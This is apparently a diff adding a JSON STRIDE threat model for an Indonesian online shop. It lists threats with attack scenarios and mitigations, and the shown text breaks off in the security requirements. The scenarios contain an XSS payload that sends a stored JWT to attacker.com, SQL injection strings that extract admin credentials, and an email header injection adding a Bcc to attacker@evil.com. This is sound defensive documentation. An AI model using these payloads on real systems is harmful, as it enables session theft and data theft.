@@ -1,0 +1,1066 @@
+{
+  "modelVersion": "1.0",
+  "title": "Aplikasi Toko Online - Threat Model",
+  "description": "Threat Model untuk Aplikasi Manajemen Toko Online (threaddragon.com) dengan React Frontend, Node.js API, MySQL Database, Redis Cache, dan Payment Gateway Integration",
+  "author": "Security Team",
+  "created": "2026-09-22",
+  "version": "1.0.0",
+
+  "dataFlowDiagram": {
+    "elements": [
+      {
+        "id": "user_customer",
+        "type": "externalEntity",
+        "name": "Customer",
+        "description": "User yang melakukan registrasi, login, belanja, dan pembayaran",
+        "position": { "x": 50, "y": 100 }
+      },
+      {
+        "id": "user_admin",
+        "type": "externalEntity",
+        "name": "Admin",
+        "description": "Admin user yang mengelola produk, order, dan transaksi",
+        "position": { "x": 50, "y": 300 }
+      },
+      {
+        "id": "payment_gateway",
+        "type": "externalEntity",
+        "name": "Payment Gateway (Midtrans/Xendit)",
+        "description": "External payment provider untuk proses pembayaran dan verifikasi transaksi",
+        "position": { "x": 800, "y": 200 }
+      },
+      {
+        "id": "react_frontend",
+        "type": "process",
+        "name": "React Frontend",
+        "description": "User Interface Layer - Aplikasi web React untuk customer dan admin",
+        "technology": "React JS, HTML5, CSS3, JavaScript",
+        "position": { "x": 300, "y": 100 }
+      },
+      {
+        "id": "api_server",
+        "type": "process",
+        "name": "Node.js REST API Server",
+        "description": "Backend API - Business logic, authentication, order processing, payment handling",
+        "technology": "Node.js, Express.js, JWT, Middleware",
+        "position": { "x": 500, "y": 200 }
+      },
+      {
+        "id": "mysql_database",
+        "type": "dataStore",
+        "name": "MySQL Database",
+        "description": "Primary data storage untuk user, products, orders, transactions",
+        "technology": "MySQL 8.0+, InnoDB",
+        "encryption": "AES-256",
+        "position": { "x": 300, "y": 450 }
+      },
+      {
+        "id": "redis_cache",
+        "type": "dataStore",
+        "name": "Redis Cache",
+        "description": "In-memory cache untuk session, user data, product cache",
+        "technology": "Redis 6.0+",
+        "ttl": "1800 seconds",
+        "position": { "x": 500, "y": 450 }
+      },
+      {
+        "id": "email_service",
+        "type": "process",
+        "name": "Email Service",
+        "description": "Email notification service untuk order confirmation, password reset, alerts",
+        "technology": "SMTP, Node Mailer",
+        "position": { "x": 700, "y": 300 }
+      },
+      {
+        "id": "auth_module",
+        "type": "process",
+        "name": "Authentication Module",
+        "description": "JWT token generation, validation, refresh token management",
+        "technology": "JWT, bcrypt, crypto",
+        "position": { "x": 500, "y": 50 }
+      }
+    ],
+
+    "dataFlows": [
+      {
+        "id": "df_customer_frontend",
+        "from": "user_customer",
+        "to": "react_frontend",
+        "name": "User Input & Browse",
+        "description": "Customer melakukan input (login, register, search, order)",
+        "protocol": "HTTPS TLS 1.2+",
+        "dataInvolved": ["Username", "Password", "Email", "Product ID", "Order Details"]
+      },
+      {
+        "id": "df_admin_frontend",
+        "from": "user_admin",
+        "to": "react_frontend",
+        "name": "Admin Management",
+        "description": "Admin mengelola produk, order, dan transaksi melalui frontend",
+        "protocol": "HTTPS TLS 1.2+",
+        "dataInvolved": ["Admin Credentials", "Product Data", "Order Status", "Transaction Info"]
+      },
+      {
+        "id": "df_frontend_api",
+        "from": "react_frontend",
+        "to": "api_server",
+        "name": "REST API Calls",
+        "description": "Frontend melakukan HTTP request ke backend API",
+        "protocol": "HTTPS TLS 1.2+",
+        "method": ["GET", "POST", "PUT", "DELETE"],
+        "authentication": "Bearer Token (JWT)",
+        "dataInvolved": ["JWT Token", "Request Body", "Headers"]
+      },
+      {
+        "id": "df_api_db",
+        "from": "api_server",
+        "to": "mysql_database",
+        "name": "Database Queries",
+        "description": "API melakukan query ke MySQL database",
+        "protocol": "SSL/TLS",
+        "dataInvolved": ["SQL Queries", "User Data", "Product Info", "Order Data", "Transaction Records"],
+        "encryption": "Transport Layer Encryption"
+      },
+      {
+        "id": "df_api_cache",
+        "from": "api_server",
+        "to": "redis_cache",
+        "name": "Cache Operations",
+        "description": "API cache session dan data ke Redis",
+        "protocol": "TCP with AUTH",
+        "operations": ["SET", "GET", "DEL", "EXPIRE"],
+        "ttl": "30 minutes for session"
+      },
+      {
+        "id": "df_api_payment",
+        "from": "api_server",
+        "to": "payment_gateway",
+        "name": "Payment Request & Verification",
+        "description": "API mengirim payment request dan menerima webhook callback",
+        "protocol": "HTTPS REST API",
+        "encryption": "HMAC-SHA256 Signature",
+        "dataInvolved": ["Payment Amount", "Customer Info", "Transaction ID", "Payment Status"]
+      },
+      {
+        "id": "df_payment_result",
+        "from": "payment_gateway",
+        "to": "api_server",
+        "name": "Webhook Callback",
+        "description": "Payment gateway mengirim webhook untuk payment status update",
+        "protocol": "HTTPS Webhook",
+        "method": "POST",
+        "signature": "HMAC-SHA256"
+      },
+      {
+        "id": "df_api_email",
+        "from": "api_server",
+        "to": "email_service",
+        "name": "Email Notification",
+        "description": "API mengirim email untuk order confirmation, alerts, password reset",
+        "protocol": "SMTP TLS",
+        "dataInvolved": ["Recipient Email", "Subject", "Email Body", "Attachments"],
+        "rateLimit": "5 emails per minute per user"
+      },
+      {
+        "id": "df_auth_service",
+        "from": "api_server",
+        "to": "auth_module",
+        "name": "Authentication",
+        "description": "API menggunakan auth module untuk token generation dan validation",
+        "dataInvolved": ["Credentials", "JWT Token", "Refresh Token", "Claims"]
+      }
+    ]
+  },
+
+  "threats": [
+    {
+      "id": "THREAT-001",
+      "title": "Spoofing Identitas User - Session Hijacking",
+      "category": "Spoofing",
+      "severity": "HIGH",
+      "status": "Identified",
+      "affectedElements": ["react_frontend", "auth_module", "redis_cache"],
+
+      "description": "Attacker dapat mencuri JWT token melalui XSS atau network sniffing untuk mengakses akun user",
+
+      "attackVector": [
+        "XSS injection di comment/review section",
+        "Man-in-the-Middle attack untuk network sniffing",
+        "LocalStorage token exposure",
+        "Long-lived tokens tanpa refresh strategy"
+      ],
+
+      "cveReferences": ["CVE-2016-5538", "CVE-2018-1000007"],
+
+      "vulnerabilityDetails": {
+        "root_cause": "Token tidak memiliki expiration pendek dan disimpan insecure",
+        "attack_complexity": "Low",
+        "privileges_required": "None",
+        "user_interaction": "Required (user harus visit malicious page)"
+      },
+
+      "detailedScenario": {
+        "step1": "Attacker inject XSS payload di kolom comment produk: <img src=x onerror=\"fetch('https://attacker.com?token='+localStorage.getItem('jwt'))\">",
+        "step2": "Customer membuka page dengan comment tersebut",
+        "step3": "JWT token dari localStorage terkirim ke attacker",
+        "step4": "Attacker menggunakan token untuk membuat request authenticated",
+        "step5": "Attacker dapat mengakses akun, mengubah data, atau membuat pembelian"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-001-1",
+          "title": "Implementasi Token Expiration",
+          "description": "JWT token harus memiliki short expiration time",
+          "implementation": "Set exp claim: 30 menit untuk access token, 7 hari untuk refresh token",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-001-2",
+          "title": "Gunakan HttpOnly & Secure Cookie",
+          "description": "Simpan token dalam HttpOnly, Secure, SameSite cookie, bukan localStorage",
+          "implementation": "res.cookie('jwt', token, { httpOnly: true, secure: true, sameSite: 'Strict' })",
+          "priority": "CRITICAL",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-001-3",
+          "title": "Implementasi Token Rotation",
+          "description": "Refresh token harus di-rotate setiap kali digunakan",
+          "implementation": "Setiap refresh request return new refresh token + new access token",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-001-4",
+          "title": "CSRF Protection",
+          "description": "Implementasi CSRF token untuk state-changing operations",
+          "implementation": "Set SameSite=Strict, implementasi CSRF token untuk POST/PUT/DELETE",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-001-5",
+          "title": "XSS Prevention",
+          "description": "Implement input validation dan output encoding",
+          "implementation": "Sanitize user input, encode output, use Content Security Policy (CSP)",
+          "priority": "CRITICAL",
+          "effort": "High"
+        },
+        {
+          "id": "MIT-001-6",
+          "title": "Monitor Suspicious Login Activity",
+          "description": "Alert jika login dari IP/device baru atau unusual patterns",
+          "implementation": "Log semua login attempts, compare dengan historical IP/device data",
+          "priority": "HIGH",
+          "effort": "Medium"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-002",
+      "title": "Tampering Data Harga Produk",
+      "category": "Tampering",
+      "severity": "CRITICAL",
+      "status": "Identified",
+      "affectedElements": ["react_frontend", "api_server", "mysql_database"],
+
+      "description": "Attacker dapat mengubah harga produk di frontend sebelum melakukan pembayaran",
+
+      "attackVector": [
+        "Browser Developer Console manipulation",
+        "Modifying network request dengan proxy tools",
+        "Direct API call dengan parameter harga yang salah",
+        "Database direct manipulation"
+      ],
+
+      "detailedScenario": {
+        "step1": "Customer membuka halaman checkout",
+        "step2": "Customer buka Browser Developer Console (F12)",
+        "step3": "Customer inspect element, temukan input dengan value harga original: 500000",
+        "step4": "Customer ubah value menjadi 1000",
+        "step5": "Customer submit order",
+        "step6": "Frontend kirim harga 1000 ke backend",
+        "step7": "API tidak validasi harga, langsung accept",
+        "step8": "Order dibuat dengan harga 1000 (seharusnya 500000)"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-002-1",
+          "title": "Server-side Price Validation (WAJIB)",
+          "description": "Selalu validasi harga di backend sebelum order diproses",
+          "implementation": "Backend ambil harga dari database, bandingkan dengan request, jika tidak match reject order",
+          "priority": "CRITICAL",
+          "effort": "Low",
+          "code_example": "const dbPrice = await Product.findById(productId).select('price'); if(dbPrice !== requestPrice) { throw new Error('Price mismatch'); }"
+        },
+        {
+          "id": "MIT-002-2",
+          "title": "Calculate Total di Server",
+          "description": "Calculate order total harga di backend, jangan trust frontend calculation",
+          "implementation": "Backend iterate setiap item, ambil harga current dari DB, calculate total, bandingkan dengan request total",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-002-3",
+          "title": "Digital Signature pada Order Data",
+          "description": "Sign order data dengan HMAC untuk detect tampering",
+          "implementation": "HMAC-SHA256(order_data + secret_key) = signature, verify di server",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-002-4",
+          "title": "Database Constraints",
+          "description": "Implementasi database constraints untuk data integrity",
+          "implementation": "PRIMARY KEY, UNIQUE, NOT NULL constraints, CHECK constraints untuk price > 0",
+          "priority": "MEDIUM",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-002-5",
+          "title": "Audit Logging untuk Perubahan Harga",
+          "description": "Log semua perubahan harga produk dengan timestamp, user, old value, new value",
+          "implementation": "Create audit_log table, log setiap UPDATE pada product.price",
+          "priority": "MEDIUM",
+          "effort": "Medium"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-003",
+      "title": "Information Disclosure - Kebocoran Data Customer",
+      "category": "Information Disclosure",
+      "severity": "CRITICAL",
+      "status": "Identified",
+      "affectedElements": ["api_server", "mysql_database", "react_frontend"],
+
+      "description": "Attacker dapat mengakses data customer yang sensitive melalui API endpoint yang tidak ter-protect",
+
+      "attackVector": [
+        "Unauthenticated API access",
+        "Broken access control pada endpoints",
+        "Database error messages expose schema",
+        "API responses memuat sensitive data tanpa masking"
+      ],
+
+      "detailedScenario": {
+        "step1": "Attacker melakukan reconnaissance pada API endpoints",
+        "step2": "Attacker find endpoint /api/users yang tidak require authentication",
+        "step3": "Attacker call: GET /api/users",
+        "step4": "API return full user database dengan email, phone, address, password hash",
+        "step5": "Attacker extract data, perform credential stuffing attack"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-003-1",
+          "title": "Encrypt Sensitive Data at Rest",
+          "description": "Encrypt PII dan financial data di database menggunakan AES-256",
+          "implementation": "Implement field-level encryption untuk email, phone, address, ssn, credit card, dll",
+          "priority": "CRITICAL",
+          "effort": "High"
+        },
+        {
+          "id": "MIT-003-2",
+          "title": "Role-Based Access Control (RBAC)",
+          "description": "Implementasi authorization check pada setiap endpoint",
+          "implementation": "Middleware untuk verify user role, only return data user own atau admin authorized",
+          "priority": "CRITICAL",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-003-3",
+          "title": "API Data Masking",
+          "description": "Mask sensitive data di API responses",
+          "implementation": "Email: user****@domain.com, Phone: 0812****6789, tidak return password hash",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-003-4",
+          "title": "Parametrized Queries (Prevent SQL Injection)",
+          "description": "Gunakan parameterized queries untuk semua database operations",
+          "implementation": "Use prepared statements dengan placeholder ? atau named parameters",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-003-5",
+          "title": "Encrypt Database Backups",
+          "description": "Semua database backups harus di-encrypt dengan strong cipher",
+          "implementation": "GPG encryption atau AWS KMS untuk backup files",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-003-6",
+          "title": "Error Handling - No Info Disclosure",
+          "description": "Jangan expose database details di error messages",
+          "implementation": "Return generic error message ke client, log detailed error server-side",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-003-7",
+          "title": "HTTPS Only Communication",
+          "description": "Semua communication harus encrypted dengan TLS 1.2+",
+          "implementation": "HTTP to HTTPS redirect, HSTS headers, disable weak ciphers",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-004",
+      "title": "Denial of Service (DoS) - Server Overload",
+      "category": "Denial of Service",
+      "severity": "HIGH",
+      "status": "Identified",
+      "affectedElements": ["api_server", "mysql_database", "redis_cache"],
+
+      "description": "Attacker dapat overload server dengan request volume tinggi, menyebabkan service unavailable",
+
+      "attackVector": [
+        "HTTP request flooding",
+        "Database connection exhaustion",
+        "Memory exhaustion via caching",
+        "Email bombing attack"
+      ],
+
+      "detailedScenario": {
+        "step1": "Attacker membuat bot script untuk send 10,000 requests/detik",
+        "step2": "Target: GET /api/products atau POST /api/orders",
+        "step3": "Server queue penuh, tidak bisa handle request baru",
+        "step4": "Database connection pool exhausted",
+        "step5": "Legitimate users mendapat 503 Service Unavailable",
+        "step6": "Service down selama beberapa jam"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-004-1",
+          "title": "Rate Limiting",
+          "description": "Limit request rate per IP address",
+          "implementation": "10 requests per minute per IP, exponential backoff for repeated violations",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-004-2",
+          "title": "CAPTCHA untuk Forms",
+          "description": "Protect login, registration, contact forms dengan CAPTCHA",
+          "implementation": "Google reCAPTCHA v3 atau hCaptcha",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-004-3",
+          "title": "DDoS Protection Service",
+          "description": "Use CDN dengan built-in DDoS protection",
+          "implementation": "CloudFlare, AWS CloudFront, atau Akamai",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-004-4",
+          "title": "Database Connection Pooling",
+          "description": "Limit dan reuse database connections",
+          "implementation": "Connection pool size: 20-50 connections, timeout: 30 seconds",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-004-5",
+          "title": "Request Queuing & Throttling",
+          "description": "Queue excessive requests untuk processing later",
+          "implementation": "Bull queue, Redis-based queue untuk async processing",
+          "priority": "MEDIUM",
+          "effort": "High"
+        },
+        {
+          "id": "MIT-004-6",
+          "title": "Email Rate Limiting",
+          "description": "Limit email sending per user",
+          "implementation": "Max 5 emails per minute per user, prevent email bombing",
+          "priority": "MEDIUM",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-004-7",
+          "title": "Web Application Firewall (WAF)",
+          "description": "Configure WAF rules untuk detect dan block attack patterns",
+          "implementation": "AWS WAF, ModSecurity, atau CloudFlare WAF",
+          "priority": "HIGH",
+          "effort": "Medium"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-005",
+      "title": "Elevation of Privilege - Unauthorized Admin Access",
+      "category": "Elevation of Privilege",
+      "severity": "CRITICAL",
+      "status": "Identified",
+      "affectedElements": ["api_server", "react_frontend", "mysql_database"],
+
+      "description": "Regular user dapat mengakses admin functions atau escalate privilege mereka",
+
+      "attackVector": [
+        "Missing authorization checks pada admin endpoints",
+        "Role bypass di JWT token",
+        "Direct API call ke admin endpoints",
+        "URL parameter manipulation"
+      ],
+
+      "detailedScenario": {
+        "step1": "Customer login dengan akun biasa, dapat JWT token dengan role='user'",
+        "step2": "Customer mencoba akses: GET /api/admin/products",
+        "step3": "API tidak check apakah user adalah admin",
+        "step4": "API return semua products data (termasuk cost, profit margin)",
+        "step5": "Customer dapat juga POST /api/admin/products/1 untuk ubah harga",
+        "step6": "Customer atau attacker ubah semua product prices"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-005-1",
+          "title": "JWT Role-Based Authorization",
+          "description": "Include role dalam JWT token dan verify pada setiap endpoint",
+          "implementation": "JWT payload: {sub: userId, role: 'admin', iat: ..., exp: ...}",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-005-2",
+          "title": "Authorization Middleware",
+          "description": "Implementasi middleware untuk verify authorization sebelum handler execute",
+          "implementation": "app.use('/api/admin', requireRole('admin'), adminHandler)",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-005-3",
+          "title": "Multi-Factor Authentication (MFA) untuk Admin",
+          "description": "Mandatory MFA untuk semua admin accounts",
+          "implementation": "TOTP (Google Authenticator) atau U2F key",
+          "priority": "CRITICAL",
+          "effort": "High"
+        },
+        {
+          "id": "MIT-005-4",
+          "title": "IP Whitelisting untuk Admin Panel",
+          "description": "Restrict admin panel access hanya dari whitelisted IP addresses",
+          "implementation": "Admin access hanya dari office/VPN IP, deny others",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-005-5",
+          "title": "Comprehensive Audit Logging",
+          "description": "Log semua admin actions dengan detail (who, what, when, where, why)",
+          "implementation": "Log CREATE, READ, UPDATE, DELETE operations untuk sensitive resources",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-005-6",
+          "title": "Admin Session Timeout",
+          "description": "Force logout admin setelah inactivity",
+          "implementation": "15 minutes inactivity timeout, require re-authentication",
+          "priority": "MEDIUM",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-005-7",
+          "title": "Principle of Least Privilege",
+          "description": "Grant minimal permissions untuk setiap admin user",
+          "implementation": "Super Admin, Product Manager, Order Manager, Reporting - different roles",
+          "priority": "HIGH",
+          "effort": "Medium"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-006",
+      "title": "Tampering Transaksi Pembayaran",
+      "category": "Tampering",
+      "severity": "CRITICAL",
+      "status": "Identified",
+      "affectedElements": ["api_server", "payment_gateway", "mysql_database"],
+
+      "description": "Attacker dapat memanipulasi status transaksi pembayaran tanpa benar-benar melakukan pembayaran",
+
+      "attackVector": [
+        "Webhook replay attack",
+        "Forged webhook response",
+        "Missing signature verification",
+        "Status update dari client-side"
+      ],
+
+      "detailedScenario": {
+        "step1": "Customer melakukan order dan initiate payment via Midtrans",
+        "step2": "Attacker intercept payment webhook callback dengan proxy tool (Burp Suite)",
+        "step3": "Attacker modify webhook body: status='success' (sebelumnya 'pending')",
+        "step4": "Attacker send modified webhook ke server /api/webhook/payment",
+        "step5": "Server tidak verify signature, accept webhook tanpa validasi",
+        "step6": "Order diproses sebagai 'paid' meskipun payment belum diterima"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-006-1",
+          "title": "Webhook Signature Verification (WAJIB)",
+          "description": "Verify HMAC signature dari payment provider pada setiap webhook",
+          "implementation": "Compute HMAC-SHA256(webhook_body + merchant_key), compare dengan header signature",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-006-2",
+          "title": "Server-side Payment Status Verification",
+          "description": "Jangan trust status dari webhook callback, query payment provider untuk verify",
+          "implementation": "Setelah menerima webhook, query Midtrans/Xendit API untuk confirm payment status",
+          "priority": "CRITICAL",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-006-3",
+          "title": "Idempotency Key untuk Duplicate Prevention",
+          "description": "Use idempotency key untuk prevent duplicate order processing",
+          "implementation": "Generate unique idempotency key per payment, reject duplicate requests",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-006-4",
+          "title": "Transaction Timeout",
+          "description": "Auto-cancel pending payments setelah timeout",
+          "implementation": "If payment not completed dalam 15 menit, mark order as cancelled",
+          "priority": "MEDIUM",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-006-5",
+          "title": "Merchant Key Rotation",
+          "description": "Rotate merchant key secara berkala untuk reduce exposure",
+          "implementation": "Change merchant key setiap 6 bulan, support dual key during transition",
+          "priority": "MEDIUM",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-006-6",
+          "title": "Payment Transaction Logging & Auditing",
+          "description": "Log semua payment events untuk audit trail",
+          "implementation": "Log: transaction_id, amount, status, timestamp, webhook received, verification result",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-006-7",
+          "title": "Fraud Detection System",
+          "description": "Implement fraud detection untuk detect suspicious transactions",
+          "implementation": "Alert if amount > threshold, frequency > limit, unusual patterns",
+          "priority": "MEDIUM",
+          "effort": "High"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-007",
+      "title": "SQL Injection Attack",
+      "category": "Information Disclosure & Tampering",
+      "severity": "CRITICAL",
+      "status": "Identified",
+      "affectedElements": ["api_server", "mysql_database"],
+
+      "description": "Attacker dapat inject SQL commands melalui unsanitized input untuk mengakses atau memodifikasi database",
+
+      "attackVector": [
+        "Unvalidated search parameters",
+        "String concatenation dalam queries",
+        "Comment injection",
+        "Union-based SQL injection"
+      ],
+
+      "detailedScenario": {
+        "step1": "Attacker find search endpoint: GET /api/products?search=keyword",
+        "step2": "Attacker inject: GET /api/products?search=' OR '1'='1",
+        "step3": "Backend query: SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'",
+        "step4": "Query always true, return semua products termasuk internal data",
+        "step5": "Attacker perform UNION-based injection: ' UNION SELECT user, password FROM admin--",
+        "step6": "Attacker mendapat list semua admin credentials"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-007-1",
+          "title": "Parameterized Queries (Prepared Statements)",
+          "description": "WAJIB gunakan parameterized queries untuk semua database operations",
+          "implementation": "Gunakan ? placeholder atau named parameters, never string concatenation",
+          "priority": "CRITICAL",
+          "effort": "Low",
+          "code_example": "db.query('SELECT * FROM products WHERE name LIKE ?', [searchTerm])"
+        },
+        {
+          "id": "MIT-007-2",
+          "title": "Input Validation & Sanitization",
+          "description": "Validate semua input sebelum digunakan dalam query",
+          "implementation": "Whitelist allowed characters, reject special characters, length validation",
+          "priority": "CRITICAL",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-007-3",
+          "title": "Use ORM Framework",
+          "description": "Use ORM untuk abstract SQL queries dan prevent injection",
+          "implementation": "Sequelize, TypeORM, Prisma - provide query builder dengan built-in escaping",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-007-4",
+          "title": "Database Least Privilege",
+          "description": "Create DB user dengan minimal permissions",
+          "implementation": "App user only have SELECT, INSERT, UPDATE permissions, not DROP/ALTER",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-007-5",
+          "title": "Error Handling - Hide Database Details",
+          "description": "Don't expose SQL error messages di responses",
+          "implementation": "Catch exceptions, log server-side, return generic error message",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-007-6",
+          "title": "WAF Rules untuk SQL Injection",
+          "description": "Configure WAF untuk detect dan block SQL injection patterns",
+          "implementation": "ModSecurity rules, AWS WAF SQL injection patterns",
+          "priority": "MEDIUM",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-007-7",
+          "title": "Regular Penetration Testing",
+          "description": "Conduct regular SAST dan penetration testing untuk find vulnerabilities",
+          "implementation": "Monthly automated SAST scanning, quarterly manual penetration testing",
+          "priority": "HIGH",
+          "effort": "High"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-008",
+      "title": "Repudiation - User Deny Transaksi",
+      "category": "Repudiation",
+      "severity": "MEDIUM",
+      "status": "Identified",
+      "affectedElements": ["api_server", "mysql_database"],
+
+      "description": "User dapat menyangkal bahwa mereka melakukan transaksi tertentu karena tidak ada proof",
+
+      "attackVector": [
+        "Lack of audit trail",
+        "No transaction signing",
+        "Missing IP/device logging",
+        "No confirmation mechanism"
+      ],
+
+      "detailedScenario": {
+        "step1": "User melakukan order barang senilai Rp1.000.000",
+        "step2": "Kemudian user deny: 'Saya tidak order barang ini, akun saya mungkin ter-hack'",
+        "step3": "Company tidak punya bukti siapa yang melakukan order",
+        "step4": "Sistem tidak log IP address, device, timestamp",
+        "step5": "Company tidak bisa prove user adalah yang order, claim refund"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-008-1",
+          "title": "Comprehensive Audit Logging",
+          "description": "Log semua user actions dengan detail lengkap",
+          "implementation": "Log: user_id, action, IP address, user_agent, timestamp, result",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-008-2",
+          "title": "Transaction Signing",
+          "description": "Sign setiap transaction dengan digital signature",
+          "implementation": "HMAC-SHA256(transaction_data + user_secret), store signature",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-008-3",
+          "title": "Immutable Transaction Records",
+          "description": "Create append-only transaction log yang tidak bisa dimodifikasi",
+          "implementation": "Separate immutable_transactions table, no UPDATE/DELETE allowed",
+          "priority": "HIGH",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-008-4",
+          "title": "Email Confirmation untuk Transaksi",
+          "description": "Send confirmation email untuk setiap transaksi penting",
+          "implementation": "Order confirmation email harus include transaction details, link untuk dispute",
+          "priority": "MEDIUM",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-008-5",
+          "title": "2FA untuk Sensitive Actions",
+          "description": "Require 2FA confirmation untuk high-value transactions",
+          "implementation": "If amount > Rp500.000, require OTP confirmation via email/SMS",
+          "priority": "MEDIUM",
+          "effort": "High"
+        },
+        {
+          "id": "MIT-008-6",
+          "title": "Device Fingerprinting",
+          "description": "Capture device information untuk identify legitimate vs unauthorized access",
+          "implementation": "Log: user_agent, IP address, device fingerprint, geolocation",
+          "priority": "MEDIUM",
+          "effort": "Medium"
+        },
+        {
+          "id": "MIT-008-7",
+          "title": "Immutable Audit Log Storage",
+          "description": "Store audit logs di immutable storage dengan tamper-proof mechanism",
+          "implementation": "Use blockchain, append-only database, atau cryptographic hash chain",
+          "priority": "LOW",
+          "effort": "Very High"
+        }
+      ]
+    },
+
+    {
+      "id": "THREAT-009",
+      "title": "Command Injection - Email Header Injection",
+      "category": "Tampering",
+      "severity": "HIGH",
+      "status": "Identified",
+      "affectedElements": ["email_service", "api_server"],
+
+      "description": "Attacker dapat inject commands di email headers untuk spam atau send ke unauthorized recipients",
+
+      "attackVector": [
+        "Unsanitized email parameters",
+        "Raw user input dalam email headers",
+        "CRLF injection"
+      ],
+
+      "detailedScenario": {
+        "step1": "Customer register dengan nama: 'John\\nBcc: attacker@evil.com'",
+        "step2": "System send confirmation email dengan header: Bcc: attacker@evil.com",
+        "step3": "Email terkirim ke both legitimate customer AND attacker",
+        "step4": "Attacker dapat inject To, Cc, Bcc headers untuk spam campaign"
+      },
+
+      "mitigations": [
+        {
+          "id": "MIT-009-1",
+          "title": "Email Header Sanitization",
+          "description": "Sanitize semua email parameters sebelum digunakan",
+          "implementation": "Remove newlines, carriage returns, semicolons dari email parameters",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-009-2",
+          "title": "Input Validation",
+          "description": "Validate email format dan name format",
+          "implementation": "Name: max 100 chars, alphanumeric + spaces only, reject special chars",
+          "priority": "MEDIUM",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-009-3",
+          "title": "Use Template Engine",
+          "description": "Gunakan template engine yang aman untuk generate email",
+          "implementation": "Handlebars, EJS dengan automatic escaping",
+          "priority": "HIGH",
+          "effort": "Low"
+        },
+        {
+          "id": "MIT-009-4",
+          "title": "SPF, DKIM, DMARC Configuration",
+          "description": "Configure DNS records untuk prevent email spoofing",
+          "implementation": "Setup SPF record, DKIM signing, DMARC policy",
+          "priority": "HIGH",
+          "effort": "Medium"
+        }
+      ]
+    }
+  ],
+
+  "securityRequirements": [
+    {
+      "id": "SEC-REQ-001",
+      "category": "Authentication",
+      "title": "Secure Authentication & Token Management",
+      "priority": "CRITICAL",
+      "description": "Implement secure JWT-based authentication dengan proper token lifecycle management",
+
+      "acceptanceCriteria": [
+        "JWT access token expiration: 30 menit",
+        "JWT refresh token expiration: 7 hari dengan rotation strategy",
+        "Tokens disimpan dalam HttpOnly, Secure, SameSite=Strict cookies",
+        "CSRF protection implementasi untuk state-changing operations",
+        "Failed login attempts dibatasi max 5x per 15 menit dengan exponential backoff",
+        "Login history logged dengan IP address, user agent, device fingerprint",
+        "Logout harus invalidate token di server-side (blacklist atau revoke)",
+        "Session timeout untuk inactivity: 15 menit",
+        "MFA mandatory untuk admin accounts (TOTP preferred)"
+      ],
+
+      "testCases": [
+        "Attempt login dengan wrong password 6x, verify lockout",
+        "Extract JWT token, wait 31 minutes, attempt API call, verify failure",
+        "Logout dan attempt API call dengan old token, verify failure",
+        "Check cookie attributes: HttpOnly=true, Secure=true, SameSite=Strict"
+      ]
+    },
+
+    {
+      "id": "SEC-REQ-002",
+      "category": "Data Protection",
+      "title": "Data Encryption at Rest & In Transit",
+      "priority": "CRITICAL",
